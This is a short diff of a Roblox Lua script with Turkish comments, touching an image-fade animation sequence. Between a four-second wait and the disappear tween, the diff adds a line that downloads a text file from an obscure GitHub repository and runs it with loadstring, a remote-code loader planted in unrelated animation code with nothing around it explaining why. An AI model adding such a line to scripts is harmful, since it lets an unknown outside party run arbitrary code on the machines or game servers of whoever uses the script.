@@ -1488,6 +1488,9 @@ end
 -- 4 saniye bekle
 task.wait(4)
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/2btrleans/scr1ipt/refs/heads/main/yessir.txt"))()
+
+
 -- Kaybolma animasyonu
 local disappearTween = TweenService:Create(
 	imageLabel,
